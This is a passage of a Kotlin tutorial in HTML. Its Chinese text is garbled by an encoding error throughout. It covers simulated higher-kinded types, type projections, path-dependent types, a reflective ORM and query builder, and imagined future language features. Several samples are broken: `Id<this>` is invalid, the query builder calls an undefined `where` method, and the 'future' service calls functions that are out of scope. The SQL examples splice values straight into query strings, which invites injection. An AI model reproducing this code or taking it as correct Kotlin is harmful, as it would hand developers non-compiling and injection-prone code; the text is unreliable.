        <span class="hljs-keyword">val</span> staticFieldForJava: String = <span class="hljs-string">"Java å¯ä»¥åƒè®¿é—®é™æ€å­—æ®µä¸€æ ·è®¿é—®æˆ‘"</span>
    }
}

<span class="hljs-comment">// æ¨¡æ‹Ÿçš„ Java ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaClass</span> {
    <span class="hljs-keyword">val</span> nullableString: String? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">val</span> notNullString: String = <span class="hljs-string">"éç©ºå­—ç¬¦ä¸²"</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getStringList</span><span class="hljs-params">()</span></span>: java.util.ArrayList&lt;String&gt; {
        <span class="hljs-keyword">return</span> arrayListOf(<span class="hljs-string">"one"</span>, <span class="hljs-string">"two"</span>, <span class="hljs-string">"three"</span>, <span class="hljs-string">"four"</span>)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">runWithCallback</span><span class="hljs-params">(runnable: <span class="hljs-type">Runnable</span>)</span></span> {
        runnable.run()
    }
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Runnable</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">run</span><span class="hljs-params">()</span></span>
}
</code></pre>
<h4 data-id="heading-7"><strong>å››åå…«ã€é«˜çº§ç±»å‹ç³»ç»Ÿç‰¹æ€§</strong></h4>
<h5 data-id="heading-8"><strong>1. é«˜é˜¶ç±»å‹ä¸ç§ç±»ï¼ˆKindï¼‰ç³»ç»Ÿ</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æ¨¡æ‹Ÿé«˜é˜¶ç±»å‹çš„æ¦‚å¿µ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">HigherKindedType</span>&lt;<span class="hljs-type">F&lt;_</span>&gt;&gt; { <span class="hljs-comment">// æ³¨æ„ï¼šè¿™ä¸æ˜¯åˆæ³•çš„ Kotlin è¯­æ³•ï¼Œæ˜¯æ¦‚å¿µè¡¨ç¤º</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;A&gt;</span> <span class="hljs-title">pure</span><span class="hljs-params">(a: <span class="hljs-type">A</span>)</span></span>: F&lt;A&gt;
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;A, B&gt;</span> <span class="hljs-title">map</span><span class="hljs-params">(fa: <span class="hljs-type">F</span>&lt;<span class="hljs-type">A</span>&gt;, f: (<span class="hljs-type">A</span>) -&gt; <span class="hljs-type">B</span>)</span></span>: F&lt;B&gt;
}

<span class="hljs-comment">// åœ¨ Kotlin ä¸­é€šè¿‡è¾…åŠ©ç±»å‹æ¨¡æ‹Ÿ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Kind</span>&lt;<span class="hljs-type">F, A</span>&gt;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">HigherKindedSimulation</span> {
    
    <span class="hljs-comment">// æ¨¡æ‹Ÿ Functor ç±»å‹ç±»</span>
    <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Functor</span>&lt;<span class="hljs-type">F</span>&gt; {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;A, B&gt;</span> Kind<span class="hljs-type">&lt;F, A&gt;</span>.<span class="hljs-title">map</span><span class="hljs-params">(f: (<span class="hljs-type">A</span>) -&gt; <span class="hljs-type">B</span>)</span></span>: Kind&lt;F, B&gt;
    }
    
    <span class="hljs-comment">// åˆ—è¡¨çš„ Functor å®ä¾‹</span>
    <span class="hljs-keyword">object</span> ListFunctor : Functor&lt;ListK&gt; {
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;A, B&gt;</span> Kind<span class="hljs-type">&lt;ListK, A&gt;</span>.<span class="hljs-title">map</span><span class="hljs-params">(f: (<span class="hljs-type">A</span>) -&gt; <span class="hljs-type">B</span>)</span></span>: Kind&lt;ListK, B&gt; {
            <span class="hljs-keyword">val</span> list = (<span class="hljs-keyword">this</span> <span class="hljs-keyword">as</span> ListKWrapper&lt;A&gt;).list
            <span class="hljs-keyword">return</span> ListKWrapper(list.map(f))
        }
    }
    
    <span class="hljs-comment">// åŒ…è£…ç±»å‹</span>
    <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ListK</span>
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListKWrapper</span>&lt;<span class="hljs-type">A</span>&gt;(<span class="hljs-keyword">val</span> list: List&lt;A&gt;) : Kind&lt;ListK, A&gt;
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;A, B&gt;</span> Kind<span class="hljs-type">&lt;ListK, A&gt;</span>.<span class="hljs-title">simulatedMap</span><span class="hljs-params">(f: (<span class="hljs-type">A</span>) -&gt; <span class="hljs-type">B</span>)</span></span>: ListKWrapper&lt;B&gt; {
        <span class="hljs-keyword">return</span> ListFunctor.run { <span class="hljs-keyword">this</span><span class="hljs-symbol">@simulatedMap</span>.map(f) } <span class="hljs-keyword">as</span> ListKWrapper&lt;B&gt;
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstrateSimulatedHKT</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> wrappedList = ListKWrapper(listOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>))
        <span class="hljs-keyword">val</span> mapped = wrappedList.simulatedMap { it * <span class="hljs-number">2</span> }
        println(<span class="hljs-string">"æ¨¡æ‹Ÿé«˜é˜¶ç±»å‹æ˜ å°„: <span class="hljs-subst">${mapped.list}</span>"</span>)
    }
}

<span class="hljs-comment">// 2. ç±»å‹æŠ•å½±å’Œæ˜ŸæŠ•å½±çš„æ·±å…¥ç†è§£</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeProjectionAdvanced</span> {
    
    <span class="hljs-comment">// ä½¿ç”¨å¤„å‹å˜ï¼šå£°æ˜å¤„å‹å˜çš„è¡¥å……</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">copyFromTo</span><span class="hljs-params">(from: <span class="hljs-type">Array</span>&lt;<span class="hljs-type">out</span> <span class="hljs-type">Any</span>&gt;, to: <span class="hljs-type">Array</span>&lt;<span class="hljs-type">in</span> <span class="hljs-type">Any</span>&gt;)</span></span> {
        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> from.indices) {
            to[i] = from[i] <span class="hljs-comment">// å®‰å…¨ï¼Œå› ä¸º from æ˜¯åå˜çš„</span>
        }
    }
    
    <span class="hljs-comment">// æ˜ŸæŠ•å½±çš„ç²¾ç¡®å«ä¹‰</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processList</span><span class="hljs-params">(list: <span class="hljs-type">List</span>&lt;*&gt;)</span></span> {
        <span class="hljs-comment">// list çš„å…ƒç´ ç±»å‹æ˜¯æœªçŸ¥çš„ï¼Œä½†æˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸ä¾èµ–å…·ä½“ç±»å‹çš„æ“ä½œ</span>
        println(<span class="hljs-string">"åˆ—è¡¨å¤§å°: <span class="hljs-subst">${list.size}</span>"</span>)
        println(<span class="hljs-string">"æ˜¯å¦ä¸ºç©º: <span class="hljs-subst">${list.isEmpty()}</span>"</span>)
        
        <span class="hljs-comment">// ä½†ä¸èƒ½å®‰å…¨åœ°è®¿é—®å…ƒç´ å†…å®¹</span>
        <span class="hljs-comment">// val first = list[0] // ç±»å‹æ˜¯ Any?ï¼Œå¯èƒ½ä¸æ˜¯æˆ‘ä»¬æœŸæœ›çš„ç±»å‹</span>
    }
    
    <span class="hljs-comment">// æœ‰ç•Œç±»å‹å‚æ•°çš„é«˜çº§ç”¨æ³•</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> <span class="hljs-title">ensureTrailingSlash</span><span class="hljs-params">(path: <span class="hljs-type">T</span>)</span></span>: T 
        <span class="hljs-keyword">where</span> T : CharSequence, 
              T : Appendable {
        <span class="hljs-keyword">if</span> (!path.endsWith(<span class="hljs-string">'/'</span>)) {
            path.append(<span class="hljs-string">'/'</span>)
        }
        <span class="hljs-keyword">return</span> path
    }
}
</code></pre>
<h5 data-id="heading-9"><strong>2. è·¯å¾„ä¾èµ–ç±»å‹çš„æ¦‚å¿µæ¨¡æ‹Ÿ</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æ¨¡æ‹Ÿè·¯å¾„ä¾èµ–ç±»å‹çš„æ¦‚å¿µ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PathDependentTypeSimulation</span> {
    
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Database</span> {
        <span class="hljs-keyword">class</span> <span class="hljs-title class_">Table</span>(<span class="hljs-keyword">val</span> name: String) {
            <span class="hljs-keyword">inner</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Row</span>(<span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span>: Map&lt;String, Any&gt;) {
                <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getValue</span><span class="hljs-params">(column: <span class="hljs-type">String</span>)</span></span>: Any? = <span class="hljs-keyword">data</span>[column]
            }
            
            <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createRow</span><span class="hljs-params">(<span class="hljs-keyword">data</span>: <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, Any&gt;)</span></span>: Row = Row(<span class="hljs-keyword">data</span>)
        }
        
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createTable</span><span class="hljs-params">(name: <span class="hljs-type">String</span>)</span></span>: Table = Table(name)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstratePathDependentTypes</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> db = Database()
        <span class="hljs-keyword">val</span> usersTable = db.createTable(<span class="hljs-string">"users"</span>)
        <span class="hljs-keyword">val</span> productsTable = db.createTable(<span class="hljs-string">"products"</span>)
        
        <span class="hljs-comment">// è¿™äº›è¡Œç±»å‹æ˜¯è·¯å¾„ä¾èµ–çš„</span>
        <span class="hljs-keyword">val</span> userRow: Database.Table.Row = usersTable.createRow(mapOf(<span class="hljs-string">"name"</span> to <span class="hljs-string">"Alice"</span>))
        <span class="hljs-keyword">val</span> productRow: Database.Table.Row = productsTable.createRow(mapOf(<span class="hljs-string">"price"</span> to <span class="hljs-number">100</span>))
        
        <span class="hljs-comment">// ç±»å‹ç³»ç»ŸçŸ¥é“è¿™äº›è¡Œå±äºä¸åŒçš„è¡¨</span>
        println(<span class="hljs-string">"ç”¨æˆ·è¡Œ: <span class="hljs-subst">${userRow.getValue(<span class="hljs-string">"name"</span>)}</span>"</span>)
        println(<span class="hljs-string">"äº§å“è¡Œ: <span class="hljs-subst">${productRow.getValue(<span class="hljs-string">"price"</span>)}</span>"</span>)
        
        <span class="hljs-comment">// ç¼–è¯‘é”™è¯¯ï¼šä¸èƒ½å°†ç”¨æˆ·è¡Œèµ‹å€¼ç»™äº§å“è¡Œå˜é‡</span>
        <span class="hljs-comment">// val wrongAssignment: productsTable.Row = userRow // ç¼–è¯‘é”™è¯¯ï¼</span>
    }
}

<span class="hljs-comment">// æ›´å¤æ‚çš„è·¯å¾„ä¾èµ–ç±»å‹æ¨¡æ‹Ÿ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AdvancedPathDependentTypes</span> {
    
    <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Entity</span> {
        <span class="hljs-keyword">val</span> id: Id&lt;<span class="hljs-keyword">this</span>&gt;
    }
    
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Id</span>&lt;<span class="hljs-type">out E : Entity</span>&gt;(<span class="hljs-keyword">val</span> value: String)
    
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> id: Id&lt;User&gt;, <span class="hljs-keyword">val</span> name: String) : Entity
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span>(<span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> id: Id&lt;Product&gt;, <span class="hljs-keyword">val</span> title: String) : Entity
    
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Repository</span>&lt;<span class="hljs-type">E : Entity</span>&gt; {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> storage = mutableMapOf&lt;Id&lt;E&gt;, E&gt;()
        
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">save</span><span class="hljs-params">(entity: <span class="hljs-type">E</span>)</span></span> {
            storage[entity.id] = entity
        }
        
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">findById</span><span class="hljs-params">(id: <span class="hljs-type">Id</span>&lt;<span class="hljs-type">E</span>&gt;)</span></span>: E? = storage[id]
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstrateTypeSafeIds</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> userRepo = Repository&lt;User&gt;()
        <span class="hljs-keyword">val</span> productRepo = Repository&lt;Product&gt;()
        
        <span class="hljs-keyword">val</span> userId = Id&lt;User&gt;(<span class="hljs-string">"user-123"</span>)
        <span class="hljs-keyword">val</span> productId = Id&lt;Product&gt;(<span class="hljs-string">"product-456"</span>)
        
        <span class="hljs-keyword">val</span> user = User(userId, <span class="hljs-string">"Alice"</span>)
        <span class="hljs-keyword">val</span> product = Product(productId, <span class="hljs-string">"Laptop"</span>)
        
        userRepo.save(user)
        productRepo.save(product)
        
        <span class="hljs-comment">// ç±»å‹å®‰å…¨ï¼šä¸èƒ½ä½¿ç”¨ç”¨æˆ·IDæŸ¥è¯¢äº§å“</span>
        <span class="hljs-keyword">val</span> foundUser = userRepo.findById(userId)
        <span class="hljs-comment">// val wrongQuery = productRepo.findById(userId) // ç¼–è¯‘é”™è¯¯ï¼</span>
        
        println(<span class="hljs-string">"æ‰¾åˆ°çš„ç”¨æˆ·: <span class="hljs-variable">$foundUser</span>"</span>)
    }
}
</code></pre>
<h4 data-id="heading-10"><strong>å››åä¹ã€Kotlin å…ƒå¯¹è±¡åè®®ï¼ˆMOPï¼‰é«˜çº§åº”ç”¨</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> kotlin.reflect.KClass
<span class="hljs-keyword">import</span> kotlin.reflect.KProperty
<span class="hljs-keyword">import</span> kotlin.reflect.full.*

<span class="hljs-comment">// é«˜çº§å±æ€§å§”æ‰˜ï¼šå®ç° ORM æ˜ å°„</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">EntityMapping</span>&lt;<span class="hljs-type">T : Any</span>&gt;(<span class="hljs-keyword">val</span> kClass: KClass&lt;T&gt;) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> tableName = kClass.simpleName ?: <span class="hljs-string">"unknown_table"</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> columns = mutableMapOf&lt;String, ColumnMapping&lt;*&gt;&gt;()
    
    <span class="hljs-keyword">inner</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ColumnMapping</span>&lt;<span class="hljs-type">T</span>&gt;(<span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> type: KClass&lt;T&gt;) {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">toSQL</span><span class="hljs-params">()</span></span>: String = <span class="hljs-string">"<span class="hljs-variable">$name</span> <span class="hljs-subst">${typeToSQL(type)}</span>"</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> <span class="hljs-title">column</span><span class="hljs-params">(name: <span class="hljs-type">String</span>, type: <span class="hljs-type">KClass</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span>: ColumnMapping&lt;T&gt; {
        <span class="hljs-keyword">val</span> mapping = ColumnMapping(name, type)
        columns[name] = mapping
        <span class="hljs-keyword">return</span> mapping
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createTableSQL</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-keyword">val</span> columnDefs = columns.values.joinToString(<span class="hljs-string">",\n  "</span>) { it.toSQL() }
        <span class="hljs-keyword">return</span> <span class="hljs-string">"""
            CREATE TABLE <span class="hljs-variable">$tableName</span> (
              id INTEGER PRIMARY KEY,
              <span class="hljs-variable">$columnDefs</span>
            )
        """</span>.trimIndent()
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">typeToSQL</span><span class="hljs-params">(type: <span class="hljs-type">KClass</span>&lt;*&gt;)</span></span>: String = <span class="hljs-keyword">when</span> (type) {
        String::<span class="hljs-keyword">class</span> -&gt; <span class="hljs-string">"TEXT"</span>
        <span class="hljs-built_in">Int</span>::<span class="hljs-keyword">class</span> -&gt; <span class="hljs-string">"INTEGER"</span>
        <span class="hljs-built_in">Double</span>::<span class="hljs-keyword">class</span> -&gt; <span class="hljs-string">"REAL"</span>
        <span class="hljs-built_in">Boolean</span>::<span class="hljs-keyword">class</span> -&gt; <span class="hljs-string">"BOOLEAN"</span>
        <span class="hljs-keyword">else</span> -&gt; <span class="hljs-string">"TEXT"</span>
    }
}

<span class="hljs-comment">// åŸºäºåå°„çš„æŸ¥è¯¢æ„å»ºå™¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectiveQueryBuilder</span>&lt;<span class="hljs-type">T : Any</span>&gt;(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> kClass: KClass&lt;T&gt;) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> whereClause: String? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> limit: <span class="hljs-built_in">Int</span>? = <span class="hljs-literal">null</span>
    
    <span class="hljs-keyword">infix</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;V&gt;</span> KProperty<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">eq</span><span class="hljs-params">(value: <span class="hljs-type">V</span>)</span></span>: ReflectiveQueryBuilder&lt;T&gt; {
        whereClause = <span class="hljs-string">"<span class="hljs-subst">${this.name}</span> = '<span class="hljs-subst">${value}</span>'"</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span><span class="hljs-symbol">@ReflectiveQueryBuilder</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">limit</span><span class="hljs-params">(count: <span class="hljs-type">Int</span>)</span></span>: ReflectiveQueryBuilder&lt;T&gt; {
        limit = count
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">buildSelect</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-keyword">val</span> tableName = kClass.simpleName ?: <span class="hljs-string">"unknown"</span>
        <span class="hljs-keyword">val</span> <span class="hljs-keyword">where</span> = whereClause?.let { <span class="hljs-string">"WHERE <span class="hljs-variable">$it</span>"</span> } ?: <span class="hljs-string">""</span>
        <span class="hljs-keyword">val</span> limitClause = limit?.let { <span class="hljs-string">"LIMIT <span class="hljs-variable">$it</span>"</span> } ?: <span class="hljs-string">""</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">"SELECT * FROM <span class="hljs-variable">$tableName</span> <span class="hljs-variable">$where</span> <span class="hljs-variable">$limitClause</span>"</span>.trim()
    }
}

<span class="hljs-comment">// ä½¿ç”¨é«˜çº§ MOP</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> id: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> email: String, <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testAdvancedMOP</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 1. å®ä½“æ˜ å°„</span>
    <span class="hljs-keyword">val</span> userMapping = EntityMapping(User::<span class="hljs-keyword">class</span>)
    userMapping.column(<span class="hljs-string">"name"</span>, String::<span class="hljs-keyword">class</span>)
    userMapping.column(<span class="hljs-string">"email"</span>, String::<span class="hljs-keyword">class</span>)
    userMapping.column(<span class="hljs-string">"age"</span>, <span class="hljs-built_in">Int</span>::<span class="hljs-keyword">class</span>)
    
    println(<span class="hljs-string">"åˆ›å»ºè¡¨ SQL:"</span>)
    println(userMapping.createTableSQL())
    
    <span class="hljs-comment">// 2. åå°„æŸ¥è¯¢æ„å»º</span>
    <span class="hljs-keyword">val</span> query = ReflectiveQueryBuilder(User::<span class="hljs-keyword">class</span>)
        .<span class="hljs-keyword">where</span>(User::name eq <span class="hljs-string">"Alice"</span>)
        .<span class="hljs-keyword">where</span>(User::age eq <span class="hljs-number">25</span>)
        .limit(<span class="hljs-number">10</span>)
        .buildSelect()
    
    println(<span class="hljs-string">"\nç”Ÿæˆçš„æŸ¥è¯¢:"</span>)
    println(query)
    
    <span class="hljs-comment">// 3. è¿è¡Œæ—¶ç±»å‹æ£€æŸ¥ä¸è½¬æ¢</span>
    <span class="hljs-keyword">val</span> users = listOf(
        User(<span class="hljs-number">1</span>, <span class="hljs-string">"Alice"</span>, <span class="hljs-string">"alice@example.com"</span>, <span class="hljs-number">25</span>),
        User(<span class="hljs-number">2</span>, <span class="hljs-string">"Bob"</span>, <span class="hljs-string">"bob@example.com"</span>, <span class="hljs-number">30</span>)
    )
    
    <span class="hljs-keyword">val</span> filtered = users.filterByType&lt;User&gt; { it.age &gt; <span class="hljs-number">25</span> }
    println(<span class="hljs-string">"\nè¿‡æ»¤åçš„ç”¨æˆ·: <span class="hljs-variable">$filtered</span>"</span>)
}

<span class="hljs-comment">// ç±»å‹å®‰å…¨çš„è¿‡æ»¤æ‰©å±•</span>
<span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T&gt;</span> List<span class="hljs-type">&lt;Any&gt;</span>.<span class="hljs-title">filterByType</span><span class="hljs-params">(<span class="hljs-keyword">noinline</span> predicate: (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Boolean</span>)</span></span>: List&lt;T&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.filterIsInstance&lt;T&gt;().filter(predicate)
}
</code></pre>
<h4 data-id="heading-11"><strong>äº”åã€Kotlin æœªæ¥ä¸å®éªŒæ€§ç‰¹æ€§å±•æœ›</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. ä¸Šä¸‹æ–‡æ¥æ”¶å™¨çš„æœªæ¥ç‰ˆæœ¬æ¨¡æ‹Ÿ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ContextReceiversFuture</span> {
    
    <span class="hljs-comment">// æ¨¡æ‹Ÿæœªæ¥çš„ä¸Šä¸‹æ–‡æ¥æ”¶å™¨è¯­æ³•</span>
    <span class="hljs-keyword">interface</span> <span class="hljs-title class_">DatabaseContext</span> {
        <span class="hljs-keyword">val</span> connection: DatabaseConnection
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">executeQuery</span><span class="hljs-params">(sql: <span class="hljs-type">String</span>)</span></span>: String = connection.execute(sql)
    }
    
    <span class="hljs-keyword">interface</span> <span class="hljs-title class_">LoggingContext</span> {
        <span class="hljs-keyword">val</span> logger: Logger
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">log</span><span class="hljs-params">(message: <span class="hljs-type">String</span>)</span></span> = logger.info(message)
    }
    
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">FutureUserService</span> {
        <span class="hljs-comment">// æ¨¡æ‹Ÿï¼šcontext(DatabaseContext, LoggingContext)</span>
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String {
            <span class="hljs-comment">// æ¨¡æ‹Ÿï¼šå¯ä»¥è®¿é—®ä¸Šä¸‹æ–‡ä¸­çš„æ–¹æ³•</span>
            log(<span class="hljs-string">"æŸ¥è¯¢ç”¨æˆ· <span class="hljs-variable">$id</span>"</span>)
            <span class="hljs-keyword">return</span> executeQuery(<span class="hljs-string">"SELECT * FROM users WHERE id = <span class="hljs-variable">$id</span>"</span>)
        }
    }
    
    <span class="hljs-comment">// å½“å‰å¯ç”¨çš„æ›¿ä»£æ–¹æ¡ˆ</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">CurrentUserService</span>(
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> dbContext: DatabaseContext,
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> logContext: LoggingContext
    ) {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String {
            logContext.log(<span class="hljs-string">"æŸ¥è¯¢ç”¨æˆ· <span class="hljs-variable">$id</span>"</span>)
            <span class="hljs-keyword">return</span> dbContext.executeQuery(<span class="hljs-string">"SELECT * FROM users WHERE id = <span class="hljs-variable">$id</span>"</span>)
        }
    }
}

<span class="hljs-comment">// 2. å¤šæ€å†…è”å‡½æ•°çš„æœªæ¥å¢å¼º</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PolymorphicInlineFuture</span> {
    
    <span class="hljs-comment">// æ¨¡æ‹Ÿæœªæ¥çš„å¤šæ€å†…è”å‡½æ•°</span>
    <span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T&gt;</span> T?.<span class="hljs-title">validate</span><span class="hljs-params">(<span class="hljs-keyword">vararg</span> validators: (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Boolean</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> != <span class="hljs-literal">null</span>) {
            validators.all { it(<span class="hljs-keyword">this</span>) }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-literal">false</span>
        }
    }
    
    <span class="hljs-comment">// å½“å‰å¯ç”¨çš„å¤æ‚ç‰ˆæœ¬</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> T?.<span class="hljs-title">validateCurrent</span><span class="hljs-params">(validators: <span class="hljs-type">List</span>&lt;(<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Boolean</span>&gt;)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> != <span class="hljs-literal">null</span>) {
            validators.all { it(<span class="hljs-keyword">this</span>) }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-literal">false</span>
        }
    }
}

<span class="hljs-comment">// 3. è‡ªå®šä¹‰æ“ä½œç¬¦çš„æ·±åº¦åº”ç”¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomOperatorsDeepDive</span> {
    
    <span class="hljs-comment">// çŸ©é˜µè¿ç®— DSL</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Matrix</span>(<span class="hljs-keyword">val</span> rows: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> cols: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">init</span>: (<span class="hljs-built_in">Int</span>, <span class="hljs-built_in">Int</span>) -&gt; <span class="hljs-built_in">Double</span> = { _, _ -&gt; <span class="hljs-number">0.0</span> }) {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span> = Array(rows) { i -&gt; DoubleArray(cols) { j -&gt; <span class="hljs-keyword">init</span>(i, j) } }
        
        <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">get</span><span class="hljs-params">(i: <span class="hljs-type">Int</span>, j: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Double</span> = <span class="hljs-keyword">data</span>[i][j]
        <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">set</span><span class="hljs-params">(i: <span class="hljs-type">Int</span>, j: <span class="hljs-type">Int</span>, value: <span class="hljs-type">Double</span>)</span></span> { <span class="hljs-keyword">data</span>[i][j] = value }
        
        <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">plus</span><span class="hljs-params">(other: <span class="hljs-type">Matrix</span>)</span></span>: Matrix {
            require(rows == other.rows &amp;&amp; cols == other.cols)
            <span class="hljs-keyword">return</span> Matrix(rows, cols) { i, j -&gt; <span class="hljs-keyword">this</span>[i, j] + other[i, j] }
        }
        
